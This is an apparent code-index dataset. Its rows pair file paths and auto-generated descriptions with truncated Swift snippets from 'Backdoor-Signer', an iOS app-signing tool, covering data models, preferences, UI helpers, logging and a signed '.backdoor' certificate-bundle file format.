91,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Use regular throws instead of rethrows and explicitly specify error handling","func performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {
do {"
92,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","class SourceGET - implements functionality related to source g e t","class SourceGET {
// Private session with configuration
private let session: URLSession

init(timeoutInterval: TimeInterval = 30.0, cachePolicy: URLRequest.CachePolicy = .useProtocolCachePolicy) {"
93,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function downloadURL - implements downloadurl functionality","func downloadURL(from url: URL, completion: @escaping (Result<(Data, HTTPURLResponse?), Error>) -> Void) {
let task = session.dataTask(with: url) { data, response, error in"
94,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","/ Generic parsing method for any Decodable type","func parseJSON<T: Decodable>(data: Data) -> Result<T, Error> {
do {"
95,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parse - implements parse functionality","func parse(data: Data) -> Result<SourcesData, Error> {
return parseJSON(data: data)
}

func parseCert(data: Data) -> Result<ServerPack, Error> {"
96,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parseCert - implements parsecert functionality","func parseCert(data: Data) -> Result<ServerPack, Error> {
return parseJSON(data: data)
}

func parsec(data: Data) -> Result<[CreditsPerson], Error> {"
97,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parsec - implements parsec functionality","func parsec(data: Data) -> Result<[CreditsPerson], Error> {
return parseJSON(data: data)
}
}
"
98,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift","MARK: - Certificate (Mobileprovision file)","public struct Cert: Codable {
public var AppIDName: String
public var CreationDate: Date
public var IsXcodeManaged: Bool
public var derEncodedProfile: Data
public var PPQCheck: Bool?
public var ExpirationDate: Date
public var Name: String
public var TeamName: String
public var TimeToLive: Int"
99,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case AppIDName,
CreationDate,
IsXcodeManaged,
PPQCheck,
ExpirationDate,
Name,
TeamName,
TimeToLive,
UUID,"
100,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/FileProcessingError.swift","/ Shared error type to use across file processing operations","enum FileProcessingError: Error, LocalizedError {
case missingFile(String)
case fileIOError(Error)
case invalidPath
case unsupportedFileExtension(String)
case decompressionFailed(String)

var errorDescription: String? {"
101,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","MARK: - Sources","public struct SourcesData: Codable, Hashable {
public var name: String?
public var identifier: String
public var tintColor: String?

public var sourceURL: URL?
public var iconURL: URL?
public var website: String?
public var news: [NewsData]?
public var apps: [StoreAppsData]"
102,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","Function hash - checks if it has h","public func hash(into hasher: inout Hasher) {
hasher.combine(identifier)
}
}

public struct NewsData: Codable, Hashable {"
103,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct NewsData - implements functionality related to news data","public struct NewsData: Codable, Hashable {
public let title: String?
public let identifier: String
public let caption: String?
public let tintColor: String?
public let imageURL: String?
public let url: URL?
public let date: String
public let appID: String?
}"
104,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct StoreAppsData - implements functionality related to store apps data","public struct StoreAppsData: Codable {
public var name: String
public var developerName: String?
public var subtitle: String?
public var bundleIdentifier: String

public var iconURL: URL?
public var downloadURL: URL?
public var size: Int?
public var screenshotURLs: [URL]?"
105,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case name, developerName, subtitle, bundleIdentifier
case iconURL, downloadURL, size
case screenshotURLs, screenshots
case version, versions, versionDate, versionDescription, localizedDescription
}

public init(from decoder: Decoder) throws {"
106,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct Screenshot - implements functionality related to screenshot","public struct Screenshot: Codable {
public var imageURL: URL
public var width: Int?
public var height: Int?

public init(imageURL: URL, width: Int? = nil, height: Int? = nil) {"
107,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct StoreAppsDataVersion - implements functionality related to store apps data version","public struct StoreAppsDataVersion: Codable {
public var version: String
public var localizedDescription: String?
public var downloadURL: URL
public var size: Int?
public var date: String?
}
"
108,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/TerminalFileError.swift","/ File operation errors specific to terminal file operations","enum TerminalFileError: Error {
case invalidURL
case noData
case invalidResponse
case apiError(String)
case sessionError(String)
case parseError(String)
case fileNotFound(String)
case unknownError(String)
case failure(String)"
109,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","enum Preferences - implements functionality related to preferences","enum Preferences {
static var installPathChangedCallback: ((String?) -> Void)?
static let defaultInstallPath: String = ""https://api.palera.in""

@Storage(key: ""Backdoor.UserSpecifiedOnlinePath"", defaultValue: defaultInstallPath)
static var onlinePath: String? { didSet { installPathChangedCallback?(onlinePath) } }"
110,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","New SigningOptions struct and property","struct SigningOptions: CustomStringConvertible {
let selectedCertificateIndex: Int
let useAppIDtoTeamID: Bool

var description: String {"
111,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","MARK: - Callbacks","private extension Preferences {
static func preferredLangChangedCallback(newValue: String?) {"
112,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","Function preferredLangChangedCallback - implements preferredlangchangedcallback functionality","static func preferredLangChangedCallback(newValue: String?) {
Bundle.preferredLocalizationBundle = .makeLocalizationBundle(preferredLanguageCode: newValue)
}
}

// MARK: - Color

struct CodableColor: Codable {"
113,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","MARK: - Color","struct CodableColor: Codable {
let red: CGFloat
let green: CGFloat
let blue: CGFloat
let alpha: CGFloat

var uiColor: UIColor {"
114,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift","struct Storage - implements functionality related to storage","struct Storage<Value> {
typealias Callback = (Value) -> Void
let key: String
let defaultValue: Value
let callback: Callback?

init(key: String, defaultValue: Value, callback: Callback? = nil) {"
115,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift","struct CodableStorage - implements functionality related to codable storage","public struct CodableStorage<Value: Codable> {
public typealias Handler = (String, Value) -> Void

var key: String
var defaultValue: Value
var handler: Handler?

public init(key: String, defaultValue: Value, handler: Handler? = nil) {"
116,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Constants used by the FloatingActionButton","private enum FloatingActionButtonConstants {
/// Default appearance values
enum Defaults {"
117,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Default appearance values","enum Defaults {
/// Default title for the button
static let title = ""+""
/// Default system image name for the button
static let systemImageName = ""folder.fill""
/// Default font size
static let fontSize: CGFloat = 20
/// Default shadow opacity
static let shadowOpacity: Float = 0.1
/// Default shadow radius"
118,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Fallback colors","enum Colors {
/// Fallback background color if named color isn't found
static let fallbackBackground = UIColor.secondarySystemBackground
}
}

/// Creates a floating action button with customizable appearance
///
/// - Parameters:
///   - title: The text to display on the button (default: ""+"")"
119,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Creates a floating action button with customizable appearance / / - Parameters: /   - title: The text to display on the button (default: ""+"") /   - image: Optional image to display instead of text /   - titleColor: The color of the button title /   - backgroundColor: The background color of the button /   - font: The font to use for the button title /   - shadowOpacity: The opacity of the button's shadow /   - shadowRadius: The radius of the button's shadow /   - shadowOffset: The offset of the button's shadow /   - cornerRadius: The corner radius of the button /   - cornerCurve: The corner curve style of the button / - Returns: A configured UIButton instance","func createFloatingActionButton(
title: String? = FloatingActionButtonConstants.Defaults.title,
image: UIImage? = nil,
titleColor: UIColor = Preferences.appTintColor.uiColor,
backgroundColor: UIColor? = nil,
font: UIFont = UIFont.systemFont(ofSize: FloatingActionButtonConstants.Defaults.fontSize),
shadowOpacity: Float = FloatingActionButtonConstants.Defaults.shadowOpacity,
shadowRadius: CGFloat = FloatingActionButtonConstants.Defaults.shadowRadius,
shadowOffset: CGSize = FloatingActionButtonConstants.Defaults.shadowOffset,
cornerRadius: CGFloat = FloatingActionButtonConstants.Defaults.cornerRadius,
cornerCurve: CALayerCornerCurve = FloatingActionButtonConstants.Defaults.cornerCurve
) -> UIButton {"
120,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","Function addAddButtonToView - implements addaddbuttontoview functionality","func addAddButtonToView(
title: String? = FloatingActionButtonConstants.Defaults.title,
image: UIImage? = nil,
titleColor: UIColor = Preferences.appTintColor.uiColor,
backgroundColor: UIColor = UIColor(named: ""Cells"") ?? FloatingActionButtonConstants.Colors.fallbackBackground,
font: UIFont = UIFont.systemFont(ofSize: FloatingActionButtonConstants.Defaults.fontSize),
shadowOpacity: Float = FloatingActionButtonConstants.Defaults.shadowOpacity,
shadowRadius: CGFloat = FloatingActionButtonConstants.Defaults.shadowRadius,
shadowOffset: CGSize = FloatingActionButtonConstants.Defaults.shadowOffset,
cornerRadius: CGFloat = FloatingActionButtonConstants.Defaults.cornerRadius,
cornerCurve: CALayerCornerCurve = FloatingActionButtonConstants.Defaults.cornerCurve
) -> UIButton {"
121,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Constants used by section header components","private enum SectionHeaderConstants {
/// Font sizes
enum FontSizes {"
122,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Font sizes","enum FontSizes {
/// Title font size
static let titleSize: CGFloat = 19
/// Subtitle font size
static let subtitleSize: CGFloat = 15
/// Button font size
static let buttonSize: CGFloat = 14
}

/// Spacing and margin constants"
123,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Spacing and margin constants","enum Spacing {
/// Default top margin
static let defaultTopMargin: CGFloat = 7
/// Content inset
static let contentInset: CGFloat = 10
/// Leading padding
static let leadingPadding: CGFloat = 19
/// Trailing padding
static let trailingPadding: CGFloat = 17
/// Small spacing"
124,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ View dimensions","enum Dimensions {
/// Button corner radius
static let buttonCornerRadius: CGFloat = 13
/// Image view corner radius
static let imageCornerRadius: CGFloat = 5
/// Icon dimension
static let iconSize: CGFloat = 24
}

/// Appearance settings"
125,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Appearance settings","enum Appearance {
/// Border color for image views
static let borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor
/// Border width
static let borderWidth: CGFloat = 1
}
}

/// A section header view with inset grouped appearance
class InsetGroupedSectionHeader: UIView {"
126,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ A section header view with inset grouped appearance","class InsetGroupedSectionHeader: UIView {
/// The label displaying the section title
private let titleLabel: UILabel = {"
127,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Sets up the UI components and constraints","private func setupUI() {
addSubview(titleLabel)

NSLayoutConstraint.activate([
titleLabel.leadingAnchor.constraint(
equalTo: leadingAnchor,
constant: SectionHeaderConstants.Spacing.smallSpacing
),
titleLabel.trailingAnchor.constraint(
equalTo: trailingAnchor,"
128,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ A section header view for search results with an icon and title","class SearchAppSectionHeader: UIView {
/// The label displaying the section title
private let titleLabel: UILabel = {"
129,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Sets the icon image for the header / - Parameter image: The image to use as the icon","func setIcon(with image: UIImage?) {
iconImageView.image = image
}

/// Sets up the UI components and constraints
private func setupUI() {"
130,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Sets up the UI components and constraints","private func setupUI() {
addSubview(iconImageView)
addSubview(titleLabel)

NSLayoutConstraint.activate([
// Icon constraints
iconImageView.leadingAnchor.constraint(
equalTo: leadingAnchor,
constant: SectionHeaderConstants.Spacing.largeSpacing
),"
131,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ A section header view with a title, optional subtitle, and optional action button","class GroupedSectionHeader: UIView {
/// The label displaying the section title
private let titleLabel: UILabel = {"
132,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Sets up the UI components and constraints","private func setupUI() {
addSubview(titleLabel)
if buttonTitle != nil { addSubview(actionButton) }"
133,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Sets up the action button with the specified title / - Parameter title: The button title","private func setupButton(title: String) {
actionButton.setTitle(title, for: .normal)
actionButton.addTarget(self, action: #selector(buttonTapped), for: .touchUpInside)
}

/// Called when the action button is tapped
@objc private func buttonTapped() {"
134,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ Called when the action button is tapped","@objc private func buttonTapped() {
buttonAction?()
}

/// Returns the intrinsic content size for this view
override var intrinsicContentSize: CGSize {"
135,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift","/ A custom inline button with a gear icon for settings","class InlineButton: UIButton {
/// Creates a new inline button with the default gear icon
/// - Parameter frame: The frame rectangle for the view
override init(frame: CGRect) {"
136,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Constants used by the SectionIcons class","private enum SectionIconConstants {
/// Default sizes
enum Sizes {"
137,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Default sizes","enum Sizes {
/// Default icon size
static let defaultIconSize = CGSize(width: 52, height: 52)
/// Default symbol point size
static let symbolPointSize: CGFloat = 16
/// Default corner radius
static let cornerRadius: CGFloat = 12
/// Default inset amount for symbols
static let symbolInset: CGFloat = 7
}"
138,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Visual properties","enum Appearance {
/// Default border width
static let borderWidth: CGFloat = 1
/// Border color
static let borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor
}
}

/// Utility class for creating and managing section icons in table views
class SectionIcons {"
139,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Utility class for creating and managing section icons in table views","class SectionIcons {
/// Adds a SF Symbol icon with background color to a table view cell
///
/// - Parameters:
///   - cell: The table cell to add the icon to
///   - symbolName: The SF Symbol name to use
///   - backgroundColor: The background color for the icon
@available(iOS 13.0, *)
static func sectionIcon(
to cell: UITableViewCell,"
140,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","Function sectionIcon - implements sectionicon functionality","static func sectionIcon(
to cell: UITableViewCell,
with symbolName: String,
backgroundColor: UIColor
) {"
141,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Adds an image icon to a table view cell, with optional resizing and styling / / - Parameters: /   - cell: The table cell to add the icon to /   - originalImage: The source image to use /   - size: The desired size for the image (default: 52x52) /   - radius: The corner radius to apply (default: 12)","static func sectionImage(
to cell: UITableViewCell,
with originalImage: UIImage,
size: CGSize = SectionIconConstants.Sizes.defaultIconSize,
radius: Int = Int(SectionIconConstants.Sizes.cornerRadius)
) {"
142,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Loads an image from a URL and applies it to a table view cell / / - Parameters: /   - url: The URL to load the image from /   - cell: The table cell to apply the image to /   - indexPath: The index path of the cell (unused but kept for API compatibility) /   - tableView: The table view containing the cell (unused but kept for API compatibility)","static func loadSectionImageFromURL(
from url: URL,
for cell: UITableViewCell,
at _: IndexPath,
in _: UITableView
) {"
143,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift","/ Loads an image from a URL and returns it via completion handler / / - Parameters: /   - url: The URL to load the image from /   - completion: A closure that will be called with the loaded image or nil if failed","static func loadImageFromURL(
from url: URL,
completion: @escaping (UIImage?) -> Void
) {"
144,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","/ UIView subclass that implements a variable blur effect using private APIs","class UIVariableBlurView: UIView {
// MARK: - Private Properties

/// Gets the filter class for blur effects
private var filterClass: NSObjectProtocol? {"
145,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","/ Override to specify the layer class needed for blur effects","override class var layerClass: AnyClass {
let encodedString = ""Q0FCYWNrZHJvcExheWVy""
guard let data = Data(base64Encoded: encodedString),
let string = String(data: data, encoding: .utf8),
let layerClass = NSClassFromString(string)
else {"
146,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","MARK: - Private Methods / Sets up the variable blur filter with default values","private func setupVariableBlurFilter() {
// Make sure all required components are available
guard let filterClass = filterClass,
let filterType = filterType,
let selector = filterWithTypeSelector
else {"
147,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","/ A SwiftUI-compatible variable blur view.","struct VariableBlurView: UIViewRepresentable {
// MARK: - Properties

/// Optional custom gradient mask to use
var customGradientMask: UIImage?

/// Blur radius to apply
var blurRadius: CGFloat = 20

// MARK: - UIViewRepresentable"
148,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","MARK: - UIViewRepresentable / Creates the underlying UIKit view / - Parameter context: The context information / - Returns: A configured UIVariableBlurView","func makeUIView(context _: Context) -> UIVariableBlurView {
// Create the view with zero frame
let view = UIVariableBlurView(frame: .zero)

// Apply custom properties
view.blurRadius = blurRadius
view.gradientMask = customGradientMask ?? VariableBlurViewConstants.defaultGradientMask

return view
}"
149,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","/ Updates the view with new configuration / - Parameters: /   - uiView: The view to update /   - context: The context information","func updateUIView(_ uiView: UIVariableBlurView, context _: Context) {
// Update properties if they change
uiView.blurRadius = blurRadius
if let customMask = customGradientMask {"
150,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift","/ Constants used by the VariableBlurView","public enum VariableBlurViewConstants {
/// A gradient mask image (top is opaque, bottom is clear)
/// The gradient includes easing for a smooth transition
public static var defaultGradientMask: UIImage {"
151,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","extension Bundle - implements functionality related to bundle","extension Bundle {
static func makeLocalizationBundle(
preferredLanguageCode: String? = Preferences.preferredLanguageCode
) -> Bundle {"
152,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","Function makeLocalizationBundle - implements makelocalizationbundle functionality","static func makeLocalizationBundle(
preferredLanguageCode: String? = Preferences.preferredLanguageCode
) -> Bundle {"
153,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","extension String - implements functionality related to string","extension String {
static func localized(_ name: String) -> String {"
154,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","Function localized - implements localized functionality","static func localized(_ name: String) -> String {
return NSLocalizedString(name, bundle: .preferredLocalizationBundle, comment: """")
}

static func localized(_ name: String, arguments: CVarArg...) -> String {"
155,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","Function localized - implements localized functionality","static func localized(_ name: String, arguments: CVarArg...) -> String {
let format = NSLocalizedString(name, bundle: .preferredLocalizationBundle, comment: """")
return String(format: format, arguments: arguments)
}

/// Localizes the current string using the main bundle.
///
/// - Returns: The localized string.
func localized() -> String {"
156,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift","/ Localizes the current string using the main bundle. / / - Returns: The localized string.","func localized() -> String {
return String.localized(self)
}
}
"
157,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Language.swift","struct Language - implements functionality related to language","struct Language {
static var availableLanguages: [Self] {"
158,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","enum LogType - implements functionality related to log type","public enum LogType {
/// Default
case notice
/// Call this function to capture information that may be helpful, but isn’t essential, for troubleshooting.
case info
/// Debug-level messages to use in a development environment while actively debugging.
case debug
/// Equivalent of the debug method.
case trace
/// Warning-level messages for reporting unexpected non-fatal failures."
159,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","class Debug - implements functionality related to debug","final class Debug {
static let shared = Debug()
private let subsystem: String = {"
160,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function appendLogToFile - implements appendlogtofile functionality","private func appendLogToFile(_ message: String) {
do {"
161,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function log - implements log functionality","func log(
message: String,
type: LogType? = nil,
function: String = #function,
file: String = #file,
line _: Int = #line
) {"
162,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function showSuccessAlert - implements showsuccessalert functionality","func showSuccessAlert(with title: String, subtitle: String) {
DispatchQueue.main.async {"
163,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function showErrorAlert - implements showerroralert functionality","func showErrorAlert(with title: String, subtitle: String) {
DispatchQueue.main.async {"
164,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function showErrorUIAlert - implements showerroruialert functionality","func showErrorUIAlert(with title: String, subtitle: String) {
DispatchQueue.main.async {"
165,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","extension UIAlertController - Controls user interface and application flow","extension UIAlertController {
static func error(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {"
166,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function error - implements error functionality","static func error(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {
let alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)

alertController.addAction(UIAlertAction(title: String.localized(""OK""), style: .cancel) { _ in"
167,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift","Function coolAlert - implements coolalert functionality","static func coolAlert(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {
let alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)

for action in actions {"
168,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ A representation of a .backdoor file which contains all components needed for signing","struct BackdoorFile {
let certificate: SecCertificate // DER-encoded certificate
let p12Data: Data // Raw .p12 file data
let mobileProvisionData: Data // Raw .mobileprovision file data
let signature: Data // Signature over mobileprovision data
}

/// Provides encoding and decoding capabilities for .backdoor files
class BackdoorDecoder {"
169,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Provides encoding and decoding capabilities for .backdoor files","class BackdoorDecoder {
/// Format version constant - used to identify the encrypted format
private static let ENCRYPTED_FORMAT_VERSION: UInt8 = 1

/// Decodes a .backdoor file from raw data
/// - Parameter data: The raw content of a .backdoor file
/// - Returns: A structured BackdoorFile object with verified components
static func decodeBackdoor(from data: Data) throws -> BackdoorFile {"
170,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Decodes a .backdoor file from raw data / - Parameter data: The raw content of a .backdoor file / - Returns: A structured BackdoorFile object with verified components","static func decodeBackdoor(from data: Data) throws -> BackdoorFile {
// Check format version - first byte 0x01 indicates encrypted format
if data.count > 1 && data[0] == ENCRYPTED_FORMAT_VERSION {"
171,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Decodes an encrypted .backdoor file / - Parameter data: The encrypted .backdoor file data / - Returns: A structured BackdoorFile object","private static func decodeEncryptedBackdoor(from data: Data) throws -> BackdoorFile {
// Skip the version byte
var offset = 1

// Helper to read a length-prefixed chunk with encrypted data
func readEncryptedChunk(from data: Data, offset: inout Int) throws -> Data {"
172,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to read a length-prefixed chunk with encrypted data","func readEncryptedChunk(from data: Data, offset: inout Int) throws -> Data {
// Read original length (before encryption)
guard offset + 4 <= data.count else {"
173,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Decodes a legacy (unencrypted) .backdoor file / - Parameter data: The unencrypted .backdoor file data / - Returns: A structured BackdoorFile object","private static func decodeLegacyBackdoor(from data: Data) throws -> BackdoorFile {
var offset = 0

// Parse certificate
let certData = try readChunk(from: data, offset: &offset)
guard let certificate = SecCertificateCreateWithData(nil, certData as CFData) else {"
174,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Verifies that the signature is valid for the provided data using the certificate's public key / - Parameters: /   - certificate: The certificate containing the public key to verify against /   - data: The data that was signed /   - signature: The signature to verify","static func verifySignature(certificate: SecCertificate, data: Data, signature: Data) throws {
// Get public key from certificate
guard let publicKey = SecCertificateCopyKey(certificate) else {"
175,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Creates a new .backdoor file from individual components (legacy unencrypted format) / - Parameters: /   - certificateData: Raw DER-encoded certificate data /   - p12Data: Raw p12 data /   - mobileProvisionData: Raw mobileprovision data /   - privateKey: The private key used to sign the mobileprovision data / - Returns: A complete BackdoorFile instance","static func createBackdoorFile(
certificateData: Data,
p12Data: Data,
mobileProvisionData: Data,
privateKey: SecKey
) throws -> BackdoorFile {"
176,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Creates a new encrypted .backdoor file from individual components / - Parameters: /   - certificateData: Raw DER-encoded certificate data /   - p12Data: Raw p12 data /   - mobileProvisionData: Raw mobileprovision data /   - privateKey: The private key used to sign the mobileprovision data / - Returns: A complete BackdoorFile instance","static func createEncryptedBackdoorFile(
certificateData: Data,
p12Data: Data,
mobileProvisionData: Data,
privateKey: SecKey
) throws -> BackdoorFile {"
177,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Signs data using a private key / - Parameters: /   - data: The data to sign /   - privateKey: The private key to use for signing / - Returns: The signature data","static func signData(_ data: Data, with privateKey: SecKey) throws -> Data {
let algorithm = SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256

guard SecKeyIsAlgorithmSupported(privateKey, .sign, algorithm) else {"
178,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Encodes a BackdoorFile into raw data (legacy unencrypted format) / - Parameter backdoorFile: The structured BackdoorFile to encode / - Returns: Raw data representing the .backdoor file format","static func encodeBackdoor(backdoorFile: BackdoorFile) -> Data {
var data = Data()

// Helper to write a length-prefixed chunk
func writeChunk(_ chunkData: Data, to data: inout Data) {"
179,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to write a length-prefixed chunk","func writeChunk(_ chunkData: Data, to data: inout Data) {
let length = UInt32(chunkData.count).bigEndian
